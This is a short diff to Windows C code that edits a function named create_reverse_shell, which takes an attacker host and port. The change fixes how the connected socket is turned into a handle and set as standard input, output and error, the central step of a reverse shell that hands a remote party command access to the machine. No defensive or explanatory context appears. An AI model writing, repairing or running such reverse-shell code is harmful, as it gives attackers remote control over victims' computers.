@@ -37,10 +37,10 @@ void create_reverse_shell(const char *lhost, int lport) {
         return;
     }
 
-    // Redirect stdin, stdout, stderr to the socket using CreateFile and SetStdHandle
-    HANDLE hStdIn = (HANDLE)_get_osfhandle((int)sock);
-    HANDLE hStdOut = (HANDLE)_get_osfhandle((int)sock);
-    HANDLE hStdErr = (HANDLE)_get_osfhandle((int)sock);
+    // Redirect stdin, stdout, stderr to the socket using SetStdHandle
+    HANDLE hStdIn = (HANDLE)_get_osfhandle(_open_osfhandle((intptr_t)sock, _O_RDWR));
+    HANDLE hStdOut = hStdIn;
+    HANDLE hStdErr = hStdIn;
 
     SetStdHandle(STD_INPUT_HANDLE, hStdIn);
     SetStdHandle(STD_OUTPUT_HANDLE, hStdOut);
